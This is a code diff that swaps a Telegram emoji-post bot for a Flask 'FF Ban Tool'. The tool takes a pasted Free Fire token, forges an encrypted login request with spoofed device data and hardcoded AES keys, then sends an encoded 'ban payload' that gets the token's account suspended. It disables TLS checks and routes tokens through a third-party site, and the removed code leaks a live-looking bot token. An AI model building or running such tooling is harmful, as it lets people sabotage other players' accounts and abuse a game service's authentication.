@@ -1,492 +1,444 @@
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
-import logging
-import re
-import json
 import os
-import random
-import asyncio
-import time
-import sys
-import telegram
+import json
+import base64
+import requests
+import urllib3
+from datetime import datetime
+from flask import Flask, request, render_template_string
 
-# ---------- Logging ----------
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO,
-    stream=sys.stderr
+urllib3.disable_warnings()
+
+try:
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import pad, unpad
+except ImportError:
+    raise ImportError("pycryptodome is required")
+
+try:
+    import MajoRLogin_pb2 as mLpB
+    import MajorLoginRes_pb2 as mLrPb
+except ImportError:
+    raise ImportError("Protobuf files not found")
+
+app = Flask(__name__)
+
+# ---------- Constants ----------
+API_URL = 'https://client.ind.freefiremobile.com/GetLoginData'
+
+BODY_BASE64 = (
+    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUibievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
 )
-logger = logging.getLogger(__name__)
-logger.info(f"python-telegram-bot version: {telegram.__version__}")
 
-# ---------- Token ----------
-BOT_TOKEN = "8817070830:AAFk6xwNiU63V4QNF0V_0vgff_R5LQw3_qk"   # <-- REPLACE THIS
-if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-    BOT_TOKEN = os.getenv("BOT_TOKEN", "")
-    if not BOT_TOKEN:
-        logger.error("No bot token provided!")
-        sys.exit(1)
+AeSkEy = b'Yg&tc%DEuh6%Zc^8'
+AeSiV  = b'6oyZDr22E3ychjM%'
+mLuRl  = "https://loginbp.ggpolarbear.com/MajorLogin"
 
-# ---------- Emoji helpers ----------
-EMOJI_FILE = "emojis.json"
-PREMIUM_EMOJIS = {}
+mLhDr  = {
+    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
+    "Connection": "Keep-Alive",
+    "Accept-Encoding": "gzip",
+    "Content-Type": "application/octet-stream",
+    "Expect": "100-continue",
+    "X-GA": "v1 1",
+    "X-Unity-Version": "2018.4.11f1",
+    "ReleaseVersion": "OB53"
+}
 
-def load_emojis():
-    global PREMIUM_EMOJIS
+# ---------- Helper functions (unchanged) ----------
+
+def decode_ff_name(b64_str):
     try:
-        if os.path.exists(EMOJI_FILE):
-            with open(EMOJI_FILE, 'r', encoding='utf-8') as f:
-                PREMIUM_EMOJIS = json.load(f)
-                logger.info(f"Loaded {len(PREMIUM_EMOJIS)} emojis")
-        else:
-            logger.warning(f"{EMOJI_FILE} not found. Using fallback.")
-            PREMIUM_EMOJIS = {
-                "verified": {"id": "6147565374289220368", "fallback": "✅"},
-                "stars": {"id": "6235403472741603087", "fallback": "⭐"},
-                "heart": {"id": "6147617184479711380", "fallback": "❤️‍🔥"},
-                "done": {"id": "6274007313107915274", "fallback": "👍"},
-                "top": {"id": "5463071033256848094", "fallback": "🔝"},
-                "rocket": {"id": "6129639980387015660", "fallback": "🚀"},
-                "gem": {"id": "6129410405795110009", "fallback": "💎"},
-                "gift": {"id": "6131660826924292492", "fallback": "🎁"},
-                "boom": {"id": "6129532314146838421", "fallback": "💥"},
-                "eyes": {"id": "6129879029676776924", "fallback": "👀"},
-                "check": {"id": "6129812419028982717", "fallback": "✅"},
-                "sparkle": {"id": "6129479035077531636", "fallback": "✨"},
-            }
-    except Exception as e:
-        logger.error(f"Error loading emojis: {e}")
-        PREMIUM_EMOJIS = {"verified": {"id": "6147565374289220368", "fallback": "✅"}}
+        if not b64_str:
+            return "Unknown"
+        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
+        b64_str = b64_str.strip()
+        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
+        encrypted_bytes = base64.b64decode(b64_str)
+        decrypted_bytes = bytearray()
+        for i, byte in enumerate(encrypted_bytes):
+            key_byte = key[i % len(key)]
+            decrypted_bytes.append(byte ^ key_byte)
+        name = decrypted_bytes.decode('utf-8', errors='ignore')
+        return name if name else "Unknown"
+    except Exception:
+        return "Unknown"
 
-def get_emoji_html(name):
-    data = PREMIUM_EMOJIS.get(name)
-    return f'<tg-emoji emoji-id="{data["id"]}">{data["fallback"]}</tg-emoji>' if data else ""
+def enc(d):
+    return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))
 
-def get_similar_emoji(emoji):
-    similar_map = {
-        "😊": "smile", "❤️": "heart", "👍": "done", "⭐": "stars",
-        "🔥": "fire", "🎁": "gift", "💎": "gem", "🚀": "rocket",
-        "✅": "verified", "👀": "eyes", "💥": "boom", "🔝": "top",
-    }
-    name = similar_map.get(emoji)
-    if name and name in PREMIUM_EMOJIS:
-        return PREMIUM_EMOJIS[name]
-    return None
+def dec(d):
+    return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)
 
-FALLBACK_EMOJIS_LIST = [
-    "verified", "blue_verification", "bottle", "heart", "stars",
-    "diamond", "crown", "gift", "fire", "rocket", "smile",
-    "thumbs", "skull", "teddy", "devil", "crying", "flex"
-]
+def build_majorlogin(tok, open_id, p_type):
+    m = mLpB.MajorLogin()
+    m.event_time = str(datetime.now())[:-7]
+    m.game_name = "free fire"
+    m.platform_id = p_type
+    m.client_version = "1.120.1"
+    m.system_software = "Android OS 9 / API-28"
+    m.system_hardware = "Handheld"
+    m.telecom_operator = "Verizon"
+    m.network_type = "WIFI"
+    m.screen_width = 1920
+    m.screen_height = 1080
+    m.screen_dpi = "280"
+    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
+    m.memory = 3003
+    m.gpu_renderer = "Adreno (TM) 640"
+    m.gpu_version = "OpenGL ES 3.1 v1.46"
+    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
+    m.client_ip = "223.191.51.89"
+    m.language = "en"
+    m.open_id = open_id
+    m.open_id_type = str(p_type)
+    m.device_type = "Handheld"
+    m.access_token = tok
+    m.platform_sdk_id = 1
+    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
+    m.login_by = 3
+    m.channel_type = 3
+    m.cpu_type = 2
+    m.cpu_architecture = "64"
+    m.client_version_code = "2019118695"
+    m.login_open_id_type = p_type
+    m.origin_platform_type = str(p_type)
+    m.primary_platform_type = str(p_type)
+    return enc(m.SerializeToString())
 
-def get_random_fallback_emoji():
-    random_name = random.choice(FALLBACK_EMOJIS_LIST)
-    return PREMIUM_EMOJIS.get(random_name, PREMIUM_EMOJIS.get("stars"))
+def decode_jwt(token):
+    try:
+        payload_part = token.split('.')[1]
+        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
+        decoded_bytes = base64.urlsafe_b64decode(payload_part)
+        decoded_str = decoded_bytes.decode('utf-8')
+        return json.loads(decoded_str)
+    except Exception:
+        return {}
 
-def convert_normal_emojis_to_premium(text):
-    if not text:
-        return text
-    emoji_pattern = re.compile(
-        r'('
-        r'[\U0001F1E6-\U0001F1FF]{2}|'
-        r'[\U0001F600-\U0001F64F]|'
-        r'[\U0001F300-\U0001F5FF]|'
-        r'[\U0001F680-\U0001F6FF]|'
-        r'[\U0001F700-\U0001F77F]|'
-        r'[\U0001F780-\U0001F7FF]|'
-        r'[\U0001F800-\U0001F8FF]|'
-        r'[\U0001F900-\U0001F9FF]|'
-        r'[\U0001FA70-\U0001FAFF]|'
-        r'[\u2600-\u26FF]|'
-        r'[\u2700-\u27BF]|'
-        r'[\u2300-\u23FF]|'
-        r'[\uFE0F]|'
-        r'[\u200D]'
-        r')+',
-        flags=re.UNICODE
-    )
-    def replace_emoji(match):
-        emoji = match.group(0)
-        for name, data in PREMIUM_EMOJIS.items():
-            if data["fallback"] == emoji:
-                return f'<tg-emoji emoji-id="{data["id"]}">{emoji}</tg-emoji>'
-        similar = get_similar_emoji(emoji)
-        if similar:
-            return f'<tg-emoji emoji-id="{similar["id"]}">{emoji}</tg-emoji>'
-        fallback = get_random_fallback_emoji()
-        return f'<tg-emoji emoji-id="{fallback["id"]}">{fallback["fallback"]}</tg-emoji>'
-    return emoji_pattern.sub(replace_emoji, text)
+def fetch_majorlogin_jwt(tok):
+    """Return (jwt_token, error_message)"""
+    if tok.startswith("ey") and "." in tok:
+        return tok, None
 
-def strip_emojis(text: str) -> str:
-    emoji_pattern = re.compile(
-        r'['
-        r'\U0001F1E6-\U0001F1FF\U0001F600-\U0001F64F\U0001F300-\U0001F5FF'
-        r'\U0001F680-\U0001F6FF\U0001F700-\U0001F77F\U0001F780-\U0001F7FF'
-        r'\U0001F800-\U0001F8FF\U0001F900-\U0001F9FF\U0001FA70-\U0001FAFF'
-        r'\u2600-\u26FF\u2700-\u27BF\u2300-\u23FF\uFE0F\u200D'
-        r']+',
-        flags=re.UNICODE
-    )
-    return emoji_pattern.sub('', text).strip()
+    oId = None
+    try:
+        r = requests.get(
+            f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}",
+            headers={"User-Agent": "Mozilla/5.0"},
+            timeout=5
+        ).json()
+        oId = r.get("open_id")
+    except:
+        pass
 
-def get_emoji_id_from_text(text):
-    if not text:
-        return PREMIUM_EMOJIS.get("verified", {}).get("id")
-    emoji_pattern = re.compile(
-        r'('
-        r'[\U0001F1E6-\U0001F1FF]{2}|'
-        r'[\U0001F600-\U0001F64F]|'
-        r'[\U0001F300-\U0001F5FF]|'
-        r'[\U0001F680-\U0001F6FF]|'
-        r'[\U0001F700-\U0001F77F]|'
-        r'[\U0001F780-\U0001F7FF]|'
-        r'[\U0001F800-\U0001F8FF]|'
-        r'[\U0001F900-\U0001F9FF]|'
-        r'[\U0001FA70-\U0001FAFF]|'
-        r'[\u2600-\u26FF]|'
-        r'[\u2700-\u27BF]|'
-        r'[\u2300-\u23FF]|'
-        r'[\uFE0F]|'
-        r'[\u200D]'
-        r')+',
-        flags=re.UNICODE
-    )
-    emojis_found = emoji_pattern.findall(text)
-    if emojis_found:
-        for emoji in emojis_found:
-            for name, data in PREMIUM_EMOJIS.items():
-                if data["fallback"] == emoji:
-                    return data["id"]
-        for emoji in emojis_found:
-            similar = get_similar_emoji(emoji)
-            if similar:
-                return similar["id"]
-    return PREMIUM_EMOJIS.get("verified", {}).get("id")
-
-# ---------- Progress bar ----------
-def get_progress_bar(percent):
-    filled = int(percent / 10)
-    bar = '▓' * filled + '░' * (10 - filled)
-    return f"[{bar}] {percent}%"
-
-# ---------- Keyboards ----------
-async def media_prompt_kb():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🖼️ Yes, Add Media", callback_data="media_yes"),
-         InlineKeyboardButton("🚫 No, Just Text", callback_data="media_no")]
-    ])
-
-async def button_prompt_kb():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("✅ Yes, Add Buttons", callback_data="btn_yes"),
-         InlineKeyboardButton("❌ No, Skip Buttons", callback_data="btn_no")]
-    ])
-
-async def button_type_kb():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔗 URL Button", callback_data="btn_type_url"),
-         InlineKeyboardButton("📋 Text Button (Copy)", callback_data="btn_type_text")],
-        [InlineKeyboardButton("❌ Cancel", callback_data="btn_cancel")]
-    ])
-
-async def button_colors_kb():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔵 Blue", callback_data="btn_color_primary"),
-         InlineKeyboardButton("🟢 Green", callback_data="btn_color_success"),
-         InlineKeyboardButton("🔴 Red", callback_data="btn_color_danger")],
-        [InlineKeyboardButton("⬅️ Back", callback_data="btn_back_to_type")]
-    ])
-
-# ---------- User store ----------
-user_data_store = {}
-copy_store = {}
-
-# ---------- Command handlers ----------
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        f"<b>—͞𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐄𝐌𝐎𝐉𝐈 𝐁𝐎𝐓 ☬</b>\n"
-        f"🏵 <b>Welcome</b> {get_emoji_html('verified')}\n"
-        f"Use /make_post to create a premium post.",
-        parse_mode="HTML"
-    )
-
-async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id in user_data_store:
-        del user_data_store[user_id]
-        await update.message.reply_text("❌ Cancelled.", parse_mode="HTML")
-    else:
-        await update.message.reply_text("ℹ️ Nothing to cancel.")
-
-async def make_post_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    user_data_store[user_id] = {
-        "step": "waiting_text",
-        "buttons": [],
-        "has_media": False,
-        "media_type": None,
-        "file_id": None
-    }
-    await update.message.reply_text(
-        f"<b>—͞𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐄𝐌𝐎𝐉𝐈 𝐁𝐎𝐓 ☬</b>\n"
-        f"⚠️ <b>MAKE PREMIUM POST</b> ⚠️\n\n"
-        f"➡️ Send your text (emojis → premium) {get_emoji_html('done')}\n"
-        f"📊 /cancel to cancel",
-        parse_mode="HTML"
-    )
-
-# ---------- Callback handler ----------
-async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user_id = update.effective_user.id
-    data = query.data
-
-    if data.startswith("copy_"):
-        key = data[5:]
-        if key in copy_store:
-            await query.message.reply_text(f"📋 <b>Copied:</b>\n{copy_store[key]['text']}", parse_mode="HTML")
-            del copy_store[key]
-        else:
-            await query.message.reply_text("❌ Expired.")
-        return
-
-    if user_id not in user_data_store:
-        await query.edit_message_text("⏳ Session expired. Start /make_post again.", parse_mode="HTML")
-        return
-
-    if data == "media_yes":
-        user_data_store[user_id]["step"] = "waiting_media"
-        await query.edit_message_text("🖼️ Send any media (photo/video/doc/audio/GIF).", parse_mode="HTML")
-    elif data == "media_no":
-        user_data_store[user_id]["has_media"] = False
-        await show_preview_and_ask_buttons(update, context, query)
-    elif data == "btn_yes":
-        user_data_store[user_id]["step"] = "waiting_button_type"
-        await query.edit_message_text("🎯 Select button type:", reply_markup=await button_type_kb(), parse_mode="HTML")
-    elif data == "btn_no":
-        await show_final_preview(update, context, query)
-    elif data == "btn_type_url":
-        user_data_store[user_id]["temp_button"] = {"type": "url"}
-        user_data_store[user_id]["step"] = "waiting_button_text"
-        await query.edit_message_text("🔗 Enter button text (no limit):", parse_mode="HTML")
-    elif data == "btn_type_text":
-        user_data_store[user_id]["temp_button"] = {"type": "text"}
-        user_data_store[user_id]["step"] = "waiting_button_text"
-        await query.edit_message_text("📋 Enter button text:", parse_mode="HTML")
-    elif data == "btn_cancel":
-        await show_final_preview(update, context, query)
-    elif data == "btn_back_to_type":
-        user_data_store[user_id]["step"] = "waiting_button_type"
-        await query.edit_message_text("🎯 Select button type:", reply_markup=await button_type_kb(), parse_mode="HTML")
-    elif data.startswith("btn_color_"):
-        color = data.replace("btn_color_", "")
-        user_data_store[user_id]["temp_button"]["color"] = color
-        button = user_data_store[user_id].pop("temp_button")
-        user_data_store[user_id]["buttons"].append(button)
-        await query.edit_message_text(
-            f"✅ Button added!\nType: {button['type']}\nText: {button['text']}\nColor: {color.upper()}\n\n"
-            f"Send /addbutton to add more\nSend /donebuttons to finish",
-            parse_mode="HTML"
-        )
-        user_data_store[user_id]["step"] = "waiting_more_buttons"
-    else:
-        await query.edit_message_text("❓ Unknown.", parse_mode="HTML")
-
-# ---------- Helpers for preview and final ----------
-async def show_preview_and_ask_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE, query=None):
-    user_id = update.effective_user.id
-    data = user_data_store[user_id]
-    text = data.get("text", "") or data.get("caption", "")
-    final_text = convert_normal_emojis_to_premium(text)
-    # Send preview
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=final_text, parse_mode="HTML")
-    await context.bot.send_message(
-        chat_id=update.effective_chat.id,
-        text=f"{get_emoji_html('eyes')} <b>Add buttons?</b> {get_emoji_html('done')}",
-        reply_markup=await button_prompt_kb(),
-        parse_mode="HTML"
-    )
-    user_data_store[user_id]["step"] = "waiting_buttons"
-
-async def show_final_preview(update: Update, context: ContextTypes.DEFAULT_TYPE, query=None):
-    user_id = update.effective_user.id
-    data = user_data_store[user_id]
-    text = data.get("text", "") or data.get("caption", "")
-    final_text = convert_normal_emojis_to_premium(text)
-    buttons = data.get("buttons", [])
-    reply_markup = None
-    if buttons:
-        keyboard = []
-        icon_id = get_emoji_id_from_text(text)
-        for btn in buttons:
-            btn_dict = {
-                "text": strip_emojis(btn["text"]),
-                "style": btn.get("color", "primary")
-            }
-            if icon_id:
-                btn_dict["icon_custom_emoji_id"] = icon_id
-            if btn["type"] == "url":
-                btn_dict["url"] = btn["url"]
-            else:
-                key = str(random.randint(100000, 999999))
-                while key in copy_store:
-                    key = str(random.randint(100000, 999999))
-                copy_store[key] = {"text": btn.get("copy_text", ""), "timestamp": time.time()}
-                btn_dict["callback_data"] = f"copy_{key}"
-            keyboard.append([InlineKeyboardButton(**btn_dict)])
-        reply_markup = InlineKeyboardMarkup(keyboard)
-
-    # Loading animation
-    loading = await context.bot.send_message(
-        chat_id=update.effective_chat.id,
-        text=f"<b>✅ ✨ DONE ✨</b> {get_emoji_html('heart')}\n{get_progress_bar(0)}",
-        parse_mode="HTML"
-    )
-    for pct in [10, 30, 50, 70, 90, 100]:
-        await asyncio.sleep(0.7)
+    if not oId:
         try:
-            await loading.edit_text(
-                f"<b>✅ ✨ DONE ✨</b> {get_emoji_html('heart')}\n{get_progress_bar(pct)}",
-                parse_mode="HTML"
-            )
+            uid_headers = {"access-token": tok, "user-agent": "Mozilla/5.0"}
+            uid_res = requests.get(
+                "https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/",
+                headers=uid_headers,
+                verify=False,
+                timeout=5
+            ).json()
+            uid = uid_res.get("uid")
+            if uid:
+                openid_res = requests.post(
+                    "https://topup.pk/api/auth/player_id_login",
+                    headers={"Content-Type": "application/json"},
+                    json={"app_id": 100067, "login_id": str(uid)},
+                    verify=False,
+                    timeout=5
+                ).json()
+                oId = openid_res.get("open_id")
         except:
             pass
-    await loading.edit_text(
-        f"<b>✅ ✨ DONE ✨</b> {get_emoji_html('heart')}\n{get_progress_bar(100)}\n"
-        f"{get_emoji_html('top')} <b>post ready!</b> {get_emoji_html('rocket')}",
-        parse_mode="HTML"
-    )
-    await asyncio.sleep(0.5)
 
-    # Send final
-    if data.get("has_media") and data.get("file_id"):
-        await context.bot.send_document(
-            chat_id=update.effective_chat.id,
-            document=data["file_id"],
-            caption=final_text,
-            parse_mode="HTML",
-            reply_markup=reply_markup
-        )
+    if not oId:
+        return None, "Failed to extract Open ID. Token invalid or expired."
+
+    platforms = [8, 3, 4, 6]
+    for p_type in platforms:
+        pl = build_majorlogin(tok, oId, p_type)
+        try:
+            x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=10, verify=False)
+            if x.status_code == 200:
+                res = mLrPb.MajorLoginRes()
+                try:
+                    res.ParseFromString(dec(x.content))
+                except:
+                    res.ParseFromString(x.content)
+                if res.token:
+                    return res.token, None
+        except:
+            continue
+
+    return None, "MajorLogin failed. Account may be blocked or platform mismatch."
+
+def trigger_injection(jwt_token, version):
+    headers = {
+        'Authorization': f'Bearer {jwt_token}',
+        'X-Unity-Version': '2018.4.11f1',
+        'X-GA': 'v1 1',
+        'ReleaseVersion': str(version),
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
+        'Accept-Encoding': 'gzip'
+    }
+    body = base64.b64decode(BODY_BASE64)
+    return requests.post(API_URL, headers=headers, data=body, timeout=20, verify=False)
+
+# ---------- HTML template (embedded) ----------
+PAGE_TEMPLATE = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FF Ban Tool</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0b0e14;
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: #1a1f2b;
+            padding: 40px 50px;
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.7);
+            max-width: 700px;
+            width: 100%;
+            border: 1px solid #2c3545;
+        }
+        h1 {
+            text-align: center;
+            font-weight: 300;
+            color: #7aa5ff;
+            letter-spacing: 1px;
+            margin-top: 0;
+            border-bottom: 1px solid #2c3545;
+            padding-bottom: 15px;
+        }
+        h1 small {
+            display: block;
+            font-size: 0.5em;
+            color: #8899bb;
+            margin-top: 8px;
+        }
+        .field {
+            margin: 25px 0;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #b0c4de;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 14px 16px;
+            background: #0d121c;
+            border: 1px solid #2f3a4f;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: 0.2s;
+        }
+        input[type="text"]:focus {
+            border-color: #7aa5ff;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(122,165,255,0.2);
+        }
+        button {
+            width: 100%;
+            padding: 16px;
+            background: #3a6bd5;
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+            letter-spacing: 1px;
+        }
+        button:hover {
+            background: #2f5bbd;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(58,107,213,0.4);
+        }
+        button:active {
+            transform: translateY(0);
+        }
+        .result {
+            margin-top: 30px;
+            padding: 20px;
+            border-radius: 10px;
+            background: #111827;
+            border-left: 6px solid #3a6bd5;
+        }
+        .result.success { border-left-color: #2ecc71; }
+        .result.error { border-left-color: #e74c3c; }
+        .result h3 { margin: 0 0 12px 0; color: #ccc; }
+        .result .info { display: flex; flex-wrap: wrap; gap: 8px 20px; }
+        .result .info span { background: #1f2a3a; padding: 4px 12px; border-radius: 20px; font-size: 14px; }
+        .result .info .label { color: #8899bb; }
+        .result .info .value { color: #fff; font-weight: 500; }
+        .result .msg { margin-top: 15px; font-size: 18px; }
+        .msg.error { color: #e74c3c; }
+        .msg.success { color: #2ecc71; }
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 13px;
+            color: #556;
+        }
+        .footer a { color: #7aa5ff; text-decoration: none; }
+        .loader {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+            color: #7aa5ff;
+        }
+        .loader.active { display: block; }
+        .spinner {
+            border: 4px solid #1f2a3a;
+            border-top: 4px solid #7aa5ff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔫 FF Ban Tool <small>Enter JWT or Access Token</small></h1>
+
+        <form method="POST" action="/" onsubmit="showLoader()">
+            <div class="field">
+                <label for="token">Token</label>
+                <input type="text" name="token" id="token" placeholder="Paste your token here..." required>
+            </div>
+            <button type="submit">💥 BAN</button>
+        </form>
+
+        <div id="loader" class="loader">
+            <div class="spinner"></div>
+            <div>Processing... Please wait.</div>
+        </div>
+
+        {% if result %}
+        <div class="result {{ 'success' if result.success else 'error' }}">
+            <h3>📋 Result</h3>
+            <div class="info">
+                <span><span class="label">Nickname:</span> <span class="value">{{ result.nickname }}</span></span>
+                <span><span class="label">Account ID:</span> <span class="value">{{ result.account_id }}</span></span>
+                <span><span class="label">Region:</span> <span class="value">{{ result.region }}</span></span>
+                <span><span class="label">Version:</span> <span class="value">{{ result.version }}</span></span>
+            </div>
+            <div class="msg {{ 'success' if result.success else 'error' }}">
+                {{ result.message }}
+            </div>
+        </div>
+        {% endif %}
+
+        <div class="footer">
+            Built for Vercel · <a href="/">Reset</a>
+        </div>
+    </div>
+
+    <script>
+        function showLoader() {
+            document.getElementById('loader').classList.add('active');
+        }
+    </script>
+</body>
+</html>
+'''
+
+# ---------- Flask routes ----------
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'GET':
+        # Show empty form
+        return render_template_string(PAGE_TEMPLATE, result=None)
+
+    # POST: process token
+    token = request.form.get('token', '').strip()
+    if not token:
+        return render_template_string(PAGE_TEMPLATE, result={
+            'success': False,
+            'message': 'Please enter a valid token.',
+            'nickname': '—',
+            'account_id': '—',
+            'region': '—',
+            'version': '—'
+        })
+
+    # Step 1: Authentication
+    jwt_token, err = fetch_majorlogin_jwt(token)
+    if not jwt_token:
+        return render_template_string(PAGE_TEMPLATE, result={
+            'success': False,
+            'message': f'Authentication failed: {err}',
+            'nickname': '—',
+            'account_id': '—',
+            'region': '—',
+            'version': '—'
+        })
+
+    # Step 2: Decode JWT
+    user_data = decode_jwt(jwt_token)
+    raw_nick = user_data.get('nickname', '')
+    nickname = decode_ff_name(raw_nick)
+    region = user_data.get('lock_region', user_data.get('region', 'IND'))
+    account_id = user_data.get('account_id', 'Unknown')
+    version = user_data.get('release_version', 'Latest')
+
+    # Step 3: Inject ban payload
+    try:
+        ban_resp = trigger_injection(jwt_token, version)
+    except Exception as e:
+        return render_template_string(PAGE_TEMPLATE, result={
+            'success': False,
+            'message': f'Injection request failed: {str(e)}',
+            'nickname': nickname,
+            'account_id': account_id,
+            'region': region,
+            'version': version
+        })
+
+    if ban_resp.status_code == 200:
+        result = {
+            'success': True,
+            'message': '✅ Account successfully banned (suspended)!',
+            'nickname': nickname,
+            'account_id': account_id,
+            'region': region,
+            'version': version
+        }
     else:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text=final_text,
-            parse_mode="HTML",
-            reply_markup=reply_markup
-        )
-    await context.bot.send_message(
-        chat_id=update.effective_chat.id,
-        text=f"<b>✅ post created!</b> {get_emoji_html('gem')}\n📣 forward wherever you want",
-        parse_mode="HTML"
-    )
-    del user_data_store[user_id]
+        result = {
+            'success': False,
+            'message': f'❌ Injection failed with status {ban_resp.status_code}',
+            'nickname': nickname,
+            'account_id': account_id,
+            'region': region,
+            'version': version
+        }
 
-# ---------- Message handler ----------
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in user_data_store:
-        return
-    step = user_data_store[user_id].get("step")
+    return render_template_string(PAGE_TEMPLATE, result=result)
 
-    if step == "waiting_text":
-        if update.message.text:
-            user_data_store[user_id]["text"] = update.message.text
-            user_data_store[user_id]["original_text"] = update.message.text
-            await update.message.reply_text(
-                f"➡️ <b>Text saved!</b> {get_emoji_html('done')}\n\n"
-                f"{get_emoji_html('eyes')} <b>Add media?</b>",
-                reply_markup=await media_prompt_kb(),
-                parse_mode="HTML"
-            )
-        else:
-            await update.message.reply_text("❌ Send text.")
-        return
-
-    if step == "waiting_media":
-        if update.message.photo:
-            media_type, file_id = "photo", update.message.photo[-1].file_id
-        elif update.message.video:
-            media_type, file_id = "video", update.message.video.file_id
-        elif update.message.document:
-            media_type, file_id = "document", update.message.document.file_id
-        elif update.message.audio:
-            media_type, file_id = "audio", update.message.audio.file_id
-        elif update.message.animation:
-            media_type, file_id = "animation", update.message.animation.file_id
-        else:
-            await update.message.reply_text("❌ Unsupported media.")
-            return
-        user_data_store[user_id]["has_media"] = True
